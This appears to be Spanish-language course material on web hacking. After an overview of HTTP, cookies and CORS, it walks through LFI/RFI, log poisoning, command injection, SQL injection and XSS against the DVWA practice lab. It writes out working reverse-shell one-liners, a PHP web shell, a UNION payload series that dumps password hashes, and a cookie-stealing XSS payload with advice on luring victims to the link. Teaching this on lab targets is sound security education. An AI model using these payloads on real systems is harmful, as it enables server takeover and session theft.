# Hacking web

# Aplicaciones web

Hoy en día, gran número de aplicaciones se trabaja con ellas a través de la web. Generalmente empleando el protocolo http y sus variantes seguras. 

El hacking, en un porcentaje muy alto, consiste en explotar las vulnerabilidades que se presentan en estos casos. Estas vulnerabilidades pueden deberse a defectos de programación, configuración incorrecta, mal uso de la criptografía, ...
# protocolo http

El protocolo http se desarrolló en 1991 para permitir la publicación de documentos con enlaces a su vez a otros documentos, lo que se denomina hipertexto.

Ha evolucionado a lo largo de los años y ahora es capaz de dar soporte a aplicaciones que se ejecutan en remoto de manera similar a como lo hacen las aplicaciones de escritorio.

Las versiones existentes son:

- 1991: http/0.9
- 1996: http/1.0
- 1997: htto/1.1
- 2015: htto/2
- 2019: http/3

A pesar de su evolución se sigue basando en petición/ respuesta.

# Seguridad

Inicialmente el protocolo era bastante inseguro, como muchos de los protocolos de Internet. Ahora mismo no es así.

- **https**: permite crear un tunel cifrado en las comunicaciones entre el cliente y el servidor mediante un cifrado híbrido. Emplea TLS y se emplea las versiones 1.2 y 1.3.

- **Cabeceras de seguridad**

Los atributos de seguridad de las cookies son:

1. SomeSite: pueden asignarse tres valores:
    - SomeSite=Strict  el navegador no enviará la cookie en peticiones cross-site, es decir, aquellas en las que el dominio, protocolo y puerto no sean distintos al destino de la petición.
    - SomeSite=lax Se envían si la petición es get e iniciada por el usuario.
    - SomeSite=none no hay control, lo emplean varios navegadores, pero no Chrome
2. Secure: La cookie sólo debe ser enviada a través de una conexión segura, como HTTPS.
3. HttpOnly: impide al javascript acceder a la cookie mediante document.cookie

- Http Access Control (**CORS**) Cross-origin Resource Sharing es un mecanismo de seguridad empleado por los navegadores  cuando se solicitan recursos de un origen diferente al del primer recurso solicitado. Por ejemplo, accedemos a dominio-a.com y nos pide más recursos del mismo diminio, como pueden ser css. js, imágnenes, .... Pero más adelante nos pide recursos de dominio-b.org, como puede ser una imagen o una fuente, eso es una petición cross-origin. Estas peticiones se pueden limitar o controlar, no se deben permitir siempre, pero tampoco bloquear siempre.

La política por defecto es SOP (Same-Origin-Policy), donde sólo se confía en el mismo origen. Mediante las cabeceras se establecen las excepciones necesarias. Pueden ser dos tipos de solicides CORS:

1. Solicitudes simples
2. Solicitudes preflighted o verificadas
# Ataques http

Aprovechando las características del http existen diversos ataques, como pueden ser:

- HTTP Host Header Injection
- HTTP Request/Response Splitting
- HTTP Request Smuggling

Sólo funcionan si no se hace un manejo correcto de las cabeceras por parte del servidor.

# Vulnerabilidades web

# Aplicaciones vulnerables

Existen diversos entornos de pruebas, vamos a ver los siguientes:

[- DVWA](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/vulnerabilidades_web.html#)

Entorno con múltiples vulnerabilidades y niveles de dificultad. Disponible de diversas formas, el proyecto reside en [https://github.com/digininja/DVWA](https://github.com/digininja/DVWA) 

[- OWASP Juice Shop](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/vulnerabilidades_web.html#)

Promenten ser el más moderno y sofisticado entorno de pruebas de aplicaciones web inseguras. Disponible en [https://github.com/juice-shop/juice-shop](https://github.com/juice-shop/juice-shop) 

[- Multilidae](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/vulnerabilidades_web.html#)

También perteneciente al proyecto OWASP, disponible en [https://github.com/webpwnized/mutillidae](https://github.com/webpwnized/mutillidae) 

[- bwapp](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/vulnerabilidades_web.html#)

Aplicación web vulnerable que se ofrece como máquina virtual, disponible en [http://www.itsecgames.com/](http://www.itsecgames.com/) Un poco sencilla a día de hoy.

[- OWASP WebGoat](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/vulnerabilidades_web.html#)

Permite practicar vulnerabilidades propias de aplicaciones web basadas en java. Disponible en [https://owasp.org/www-project-webgoat/](https://owasp.org/www-project-webgoat/) 

[- OWASP Security Shepherd](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/vulnerabilidades_web.html#)

Ofrece entrenamiento y aprendizaje para aplicaciones web y móviles, disponible en [https://owasp.org/www-project-security-shepherd/](https://owasp.org/www-project-security-shepherd/) 

[- OWASP CI/CD-Goat](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/vulnerabilidades_web.html#)

Entorno vulnerable para aprendizaje de seguridad en entornos de desarrollo continuo y despliegue, disponible en [https://github.com/cider-security-research/cicd-goat](https://github.com/cider-security-research/cicd-goat) 

[- OWASP DVWS](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/vulnerabilidades_web.html#)

Entorno de aprendizaje vulnerable para web sockets, diferentes a http. Disponible en [https://owasp.org/www-project-damn-vulnerable-web-sockets/](https://owasp.org/www-project-damn-vulnerable-web-sockets/) 

[- vAPI](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/vulnerabilidades_web.html#)

[https://github.com/roottusk/vapi](https://github.com/roottusk/vapi) 

[- DVWS-node](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/vulnerabilidades_web.html#)

Entorno para probar node.js. [https://github.com/snoopysecurity/dvws-node](https://github.com/snoopysecurity/dvws-node) 

[- PortSwigger Academy](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/vulnerabilidades_web.html#)

Los creadores de burp suite ofrecen un lugar de entrenamiento gratuito para aprender sobre seguridad de sitios web. Disponible en [https://portswigger.net/web-security](https://portswigger.net/web-security)

# Local FIle Inclusion (LFI) y Remote File Inclusion (RFI)

# Incluir archivos propios y ajenos

Estas dos vulnerabilidades son similares, consisten en la posibilidad de acceder a archivos del sistema que no deberíamos poder ver (LFI), o incrustar archivos ajenos que se ejecutarán como si fueran parte de la aplicación. Vamos a ver ejemplos empleando DVWA.

- #### **LFI**
    

Si entramos en el apartado correspondiente de la aplicación DVWA nos encontramos algo como esto:

![](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/lfi1.PNG "lfi1")

Observando la url, podemos ver que la última parte hace referencia a un archivo, pues vamos a modificarla de la siguiente manera:

http://<ip_DVWA>:4280/vulnerabilities/fi/?page=../../../../../../etc/passwd

![lfipasswd](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/lfi2.PNG)

Hemos accedido a un archivo del sistema, en concreto a /etc/passwd.

Podemos emplear rutas absolutas:http://<ip_DVWA>:4280/vulnerabilities/fi/?page=/etc/passwd

![lfi-ruta-absoluta](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/lfi3.PNG)

O podemos usar en este caso [wrappers](https://www.php.net/manual/en/wrappers.php), al ser una aplicación PHP. Vamos a usar _file://_

![lfi wrappers](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/lfi4.PNG)

En este [artículo](https://blog.deephacking.tech/en/posts/exploiting-php-wrappers/) nos explica algunos otros wrappers y su uso en hacking.

- #### **RFI**
    

Ahora vamos a ver cómo introducir accesos a sitios ajenos y como los va a incluir en nuestra página, por ejemplo:

![rfi](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/lfi5.PNG)

Ahora vamos a insertar un archivo más interesante, una reverse shell realizada en php, emplearemos la de pentestmonkey, disponible en kali. Sacaremos una copia y lo editaremos:

```perl
$ mkdir shell
$ cd shell
$ cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
```

Ahora editamos el archivo para poner nuestra ip del kali y el puerto:

![shell](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/shellPhp.PNG)

Ahora creamos un pequeño servidor web con esta carpeta y este archivo, por ejemplo usando python:

```perl
$ python3 -m http.server 8080
```

Y en otra terminal ponemos el puerto 4444 a la escucha:

![nc](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/nclnvp.PNG)

Y ya hacemos el RFI en en navegador visitando la página de DVWA:

![visita shell](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/shell2.PNG)

Y acabamos de obtener una shell de la máquina víctima en el kali:

![](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/shell.PNG)

- #### **Log Poisoning (envenenamiento de logs)**
    

Ahora vamos a ver cómo inyectar código en los logs del sistema para poder conseguir ejecutar comandos en el servidor. Para ello vamos a generar actividad que provoque que en los archivos de logs aparezca código php. Para ello emplearemos DVWA, pero en una versión que no vuelca los logs a la terminal sino que los almacena, en concreto el docker vulnerables/web-dvwa disponible en [dockerhub](https://hub.docker.com/r/vulnerables/web-dvwa "dockerhub").

Accedemos a una terminal en el docker y vemos qué contiene el archivo /_var/log/apache2/access.log_

_![logs1](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/logs1.PNG)_

Ahora vamos a insertar una entrada en el log mediante modificación del get empleando netcat (nc)

_![logs 2](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/logs2.PNG)_

En el archivo access.log aparece lo siguiente:

![logs3](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/logs3.PNG)

Ahora vamos a emplear curl para modificar el user-agent:

![logs4](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/logs4.PNG)

Y el resultado en el archivo es :

![logs 5](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/logs5.PNG)

Como se puede ver, podemos insertar en estos archivos texto al azar, ahora vamos a insertar un código que nos permita ejecutar comandos en el servidot:

```php
<?php system($_GET['cmd']); ?>
```

Vamos a emplear nc, pero si empleamos curl, debemos poner carácter de escape antes del '$'.

![logs 6](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/logs6.PNG)

En el archivo de logs tenemos:

![logs 7](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/logs7.PNG)

Ahora vamos a ejecutar un comando usando LFI y este archivo envenenado, viendo el código fuente se ve claramente el resultado:

![](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/logs8.PNG)

Si observamos la url:http://192.168.0.102:4380/vulnerabilities/fi/?page=file:///var/log/apache2/access.log&**cmd=ls** 

Ahora debemos conseguir una reverse shell modificando la última parte, para ello emplearemos la ayuda de [https://www.revshells.com/](https://www.revshells.com/) 

Vamos a crear una reverse-shell empleando bash:

```php
bash -i >& /dev/tcp/192.168.1.110/4444 0>&1
```

o empleando php:

```php
php -r '$sock=fsockopen("192.168.1.110",4444);exec("bash <&3 >&3 2>&3");'
```

Pero para poderlas emplear debemos convertirlas a url con urlencoder, y poner kali a la escucha:

![logs 9](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/logs9.PNG)

y en kali tendremos una shell muy sencilla, pero funciona:

![logs 10](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/logs10.PNG)

Con bash debemos emplear bash -c "bash -i ...." para que nos funcione, la shell obtenida es algo mejor.

# File Upload vulnerabilities

# Subida insegura de archivos

Esta vulnerabilidad consiste en poder subir archivos o imágenes al servidor, y poder acceder a los mismos al estar en una ubicación conocida, o que se puede averiguar.

Vamos a ver un ejemplo en el DVWA.

Editando con hexeditor podemos meter código php:

```php
$ hexeditor perico.jpeg
```

Y podemos hacer esto:

![fileupload](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/fileupload.PNG)

O podemos insertar el código como metadatos, en este caso código más interesante, no sólo una prueba:

![fileupload 2](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/fileupload2.PNG)

Ahora accedemos al archivo mediante Local File Inclusion y veremos el resultado, vamos a probar con el primero de los archivos:

![fupload phpinfo](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/fulpload1.PNG)

Se ha ejecutado el phpinfo() empotrado en el archivo con hexeditor.

# Command Injection

# Inyección de comandos

Cuando la entrada de una aplicación se pasa a un comando del sistema operativo, esto nos puede permitir ejecutar comandos en el mismo.

En el entorno vulnerable DVWA podemos ver esta vulnerabilidad. Tenemos un cuadro de diálogo que nos permite hace ping a una ip o máquina remota:

![commandi](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/command1.PNG)

Si tratamos de añadir al comando ping que hay detrás otro comando, podremos ejecutar el comando que queramos, por ejemplo un _ls -la:_

![commandi2](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/command2.PNG)

Si ahora usamos este otro payload, combinando un coimando para obtener una reverse  shell, habremos comprometido al servidor. La reverse shell la podemos obtener de [revshells.com](https://www.revshells.com/) :

```c
1.1.1.1;bash -i >& /dev/tcp/192.168.0.110/4444 0>&1
```

Antes de usar este payload, debemos poner a la escucha nuestra máquina atacante:

# Access Control vulnerabilities (IDOR)

# BOLA (Broken Object Level Authorization)

Se corresponde con la CWE-639 (Authorization Bypass Through User-Controlled Key). Se produce cuando una entrada proporcionada por el usuario es usada para acceder directamente a objetos (ficheros, recursos, datos del usuario, ...) Esto permite saltar medidas de seguridad y acceder a datos de otros usuarios u otra información sensible.

Se puede dar cuando:

- Cuando se solicita información del usuario

```clike
https://sitio-inseguro.com/profile?user_id=12345
```

- Cuando el id de usuario es llamado en una API, como pasa e OWASP juice-shop

```clike
GET /rest/basket/3
```

- Acceso a ficheros estáticos

```clike
https://sitio-inseguro.com/files/1234.txt
```
# SQLi

# Inyección SQL

Esta vulnerabilidad permite inyectar a través de la entrada de usuario o de la aplicación instrucciones SQL que se ejecutarán en el servidor de la base de datos. 

  
Veamos este formulario de entrada:

![sqli 1](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/sqli1.PNG)

Sabemos que el usuario es admin, pero desconocemos la password, podemos usar fuerza bruta o meter lo siguiente en el usuario:

```c
admin' or '1'='1
```

El resultado es:

![sqli2](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/sqli2.PNG)

En este caso nos hemos modificado la cláusula where del select que hay detrás, y nos ha permitido acceder al área privada sin saber la contraseña.

Veamos ahora el ejemplo del apartado SQL Injection, en vez de meter el id de un usuario meteremos este payload:

```c
' or 1=1 -- -
```

Lo que hemos hecho es modificar el where para que sea siempre true, y acabar con '--' para que todo lo demás sea comentario.

![sqli 3](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/sqli3.PNG)

 Conseguimos ver todos los usuarios, no sólo uno.

Ahora aprovecharemos para consultar otras cosas empleando UNION, pero debemos primero usar una serie de payloads para saber cuantos campos y de que tipo son para obtener información:

```c
1' union select null -- -
1' union select null,null -- -
1' union select 'a',null -- -
1' union select null,'a' -- -
1' union select 1,null -- -
1' union select null,1 -- -
```

Esta serie de pruebas nos permite saber cuantos campos y sus tipos. En este caso son dos campos y admiten texto.

Vamos a ver qué base de datos tenemos y cual es su nombre:

```c
2' UNION SELECT version(),null -- -
```

Esto nos permite saber que estamos ante una base de datos MariaDB 10.1

Ahora vamos a ver el nombre de la base de datos:

```c
2' UNION SELECT 'a',database() -- -
```

Y el resultado será:

![sqli 4](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/sqli4.PNG)

Vemos que es dvwa. Esta serie de payloads nos va a dar más información sobre el esquema de la base de datos:

```c
2' UNION SELECT TABLE_SCHEMA,TABLE_NAME from information_schema.tables -- -
2' UNION SELECT 'a',column_name from information_schema.columns WHERE table_name='users' -- -
2' UNION SELECT 'a', column_name from information_schema.columns WHERE table_name='users' AND table_schema='dvwa' -- -
2' UNION SELECT first_name, password FROM dvwa.users -- -
```

El último payload nos dá lo siguiente:

![sqli 5](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/sqli_5.PNG)

Hemos obtenido la lista de usuarios y el hash de la password.

# Blind SQL Injection

# Cuando el resultado no se ve directamente

En muchas ocasiones, el resultado de loc comandos inyectados no se ven directamente ni se traducen a html, en estos casos hay que verlo indirectamente a través de otros indicios:

- Elementos que se muestran en función de una condición: si tenemos un mensaje en caso de true y otro en caso de condición false
- Introduciendo esperas: no hay resultado, si es true se produce la espera y si no no se produce.
- Provocando errores: Generamos un error o una excepción, si la condición es true se produce y si es false no, por ejemplo.
- Out of Band connections: Generamos una conexión exterior a un servidor bajo control del atacante, generalmente un DNS.

Los payload para hacer la prueba pueden ser:

```c
1' and 1=1 -- -
1' and 1=2 -- -
```

El primero genera respuesta true:

![sqli6](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/sqli6.PNG)

y el segundo respuesta false:

![sqli7](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/sqli7.PNG)

Vamos a ver la serie de payloads que nos permiten por ejemplo saber la longitud del nombre de la base de datos (esquema)

```c
1' and length(database())=1 -- -
1' and length(database())=2 -- -
1' and length(database())=3 -- -
1' and length(database())=4 -- -
```

Cuando lleguemos a 4 la respuesta es true, por tanto el nombre tiene 4 caracteres.

Ahora vamos a ver cual es la primera letra:

```c
2' and ascii(substr(database(),1,1))>97 and ascii(substr(database(),1,1))<122 -- -
2' and ascii(substr(database(),1,1))>97 and ascii(substr(database(),1,1))<103 -- -
2' and ascii(substr(database(),1,1))>100 and ascii(substr(database(),1,1))<103 -- -
2' and ascii(substr(database(),1,1))=100 -- -
```

Ya tenemos la primera letra, una 'd':

Si no hay mensaje exterior, podemos emplear retardos:

```c
2' UNION SELECT null,IF (length(database())=4,sleep(5), 'a') -- -
```

En este caso, al ser true, vemos una espera en la respuesta.

En el caso de emplear errores podemos emplear:

```c
2' SELECT null,IF (length(database())=4,(SELECT table_name from information_schema.cosa, 'a') -- -
```

El error aparece, ya que el resultado es true.

# Cross-Site Scripting (XSS)

# Inyectar código javascript en un sitio

Esta vulnerabilidad no es contra el servidor, sino contra los que lo visitan. Permite insertar código HTML y Javascript que será interpretado por el navegador del cliente.

Existen tres tipos de Cross-site Scripting:

- #### XSS reflejado: Permite insertar código en una entrada y lo va a interpretar. 
    

Primero vamos a ver si es vulnerable insertando el siguiente payload:

```php
<script>alert("soy vulnerable")</script>
```

Visitaremos el sitio de DVWA y vemos el formulario, que espera que pongamos un nombre para saludarnos:

![xss1](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss1.PNG)

Pero en vez de el nombre, introducimos el payload:

![xss2](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss2.PNG)

Veremos una ventana emergente que demuestra que el código se ha ejecutado:

![xss 3](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss_3.PNG)

Ahora vamos a emplear un payload mucho más interesante, para ello emplearemos kali para escuchar, ejecutando:

```php
$python3 -m http.server 8000
```

El payload que usaremos es este, teniendo en cuenta que la ip del kali es 192.168.0.110:

```js
<script>fetch('http://192.168.0.110:8000?cookie='+document.cookie)</script>
```

Cuando metamos este código en el textbox nombre ocurrirá esto en el kali:

![xss4](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss_4.PNG)

Como podemos ver, el Kali tiene la cookie de sesion, y podría hacer un robo de sesión, pero ... ¿Cómo usar esto en un ataque?

Para usarlo en un ataque debemos construir un link que enviaremos al usuario, con la sesión abierta, para poder recoger su cookie de sesion. Emplearemos ingeniería social.

Primero convertimos el payload con url encoder:

```js
%3Cscript%3Efetch(%27http%3A%2F%2F192.168.0.110%3A8000%3Fcookie%3D%27%2Bdocument.cookie)%3C%2Fscript%3E
```

Ahora hacemos el siguiente link:

[http://192.168.0.102:4280/vulnerabilities/xss_r/?name=%3Cscript%3Efetch(%27http%3A%2F%2F192.168.0.110%3A8000%3Fcookie%3D%27%2Bdocument.cookie)%3C%2Fscript%3E](http://192.168.0.102:4280/vulnerabilities/xss_r/?name=%3Cscript%3Efetch\(%27http%3A%2F%2F192.168.0.110%3A8000%3Fcookie%3D%27%2Bdocument.cookie\)%3C%2Fscript%3E)

Cuando el usuario lo pulse, camuflado de alguna forma, se coge la cookie:

![cookie](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss8.PNG)

En en siguiente nivel, no se permite usar '<script>', pero podemos usar otras soluciones como por ejemplo:

```js
<img src=1 onerror=alert(1)>
```

- #### XSS almacenado: en este caso, almacena el código y es ejecutado por todos los visitantes.
    

Vamos ver el ejemplo de DVWA, que es un libro de visitas:

![xssst1](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss-st1.PNG)

Al pulsar, el mensaje es visible por todos los visitantes:

![xss-st2](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss-st2.PNG)

Pero si en vez de algo tan inocente, ¿probamos con un payload?:

![xss-str3](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss-str3.PNG)

Ahora todos los visitantes verán la ventana emergente:

![xss-str5](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss-str5.PNG)

Para poder meter otros payload más interesantes, y largos, debemos eliminar la restricción de tamaño del texto, mediante las opciones de desarrollador o mediante burpsuite:

![xss-str9](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss-str-9.PNG)

Y ahora ya podemos hacer algo más interesante:

![xss-str10](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss-str10.PNG)

Ahora los visitantes nos regalarán su cookie de sesión:

![xss-str11](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss-str11.PNG)

- #### XSS DOM:
    

El DOM (Document Object Model) es la estructura de datos que contiene todos los objetos y propiedades de una página web. Los ataques XSS DOM se centran en alterar esta estructura de datos, cambiando dinámicamente la web pero en el cliente. Este ataque se centra en el cliente y no al servidor.

Veamos un ejemplo:

![xss-dom](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss-dom1.PNG)

Vemos la url, que obtiene un parametro del listbox, viendo el código fuente:

![xss-dom](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/xss-dom2.PNG)

Emplea eso para escribir directamente en el DOM mediante document.write. Podemos manupular la url y crear una con código malicioso, por ejemplo:

[http://192.168.0.102:4280/vulnerabilities/xss_d/?default=<script>alert("soy vulnerable")</script>](http://192.168.0.102:4280/vulnerabilities/xss_d/?default=<script>alert\("soy%20vulnerable"\)</script>)

Si empleamos un payload más peligroso, empleando ingeniería social, podemos obtener la cookie de sesión, por ejemplo.

# Beef-xss

# El anzuelo de pescar

![beef-xss](https://aulavirtual33.educa.madrid.org/ies.elcanaveral.mostoles/pluginfile.php/217225/mod_exescorm/content/1/beef-xss.png)

Esta herramienta nos proporciona un javascript y una herramienta para manejar los navegadores que podamos pescar, al inyectar el hook con diversos métodos XSS.

Está disponible en **[https://github.com/beefproject/beef](https://github.com/beefproject/beef)** y además como paquete instalable en Kali.

Te corresponde a tí probarla y explorarla.